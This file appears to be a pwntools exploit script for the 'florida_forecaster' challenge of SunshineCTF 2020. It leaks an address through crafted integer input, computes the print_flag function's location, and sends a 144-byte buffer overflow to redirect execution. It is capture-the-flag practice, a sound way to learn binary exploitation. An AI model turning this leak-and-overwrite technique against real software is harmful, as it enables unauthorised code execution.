#!/usr/bin/python3
#coding: utf-8

from pwn import *

context.terminal = ['urxvt', '-e', 'sh', '-c']
r = remote("chal.2020.sunshinectf.org",20002)
#r = process("./florida_forecaster")
log.info("Get leak")

r.recvuntil("Choice: ")
r.sendline("3");

r.recvuntil("(integer):")

r.sendline("1337")

r.recvuntil("(integer):")

r.sendline("-1061108231")

leak = r.recvuntil("Choice:")[:15]

leak = int(leak.decode("utf-8")[1:],16)
print(hex(leak))

# 128d = win ; 1369 = overflow
# offset = 220

log.info("Calculating flag func addr")

win = leak - 220

log.success("print_flag function at {}".format((hex(win))))

junk = b"A"*144 # offset found using gdb

payload = junk+p64(win)[:-2]

print(payload)

r.sendline("2")

print(r.recvuntil("data\n"))

r.sendline(payload)

print(r.recvuntil("y/n)?\n"))

print(r.recvuntil("once...\n"))

log.success(r.recvall())

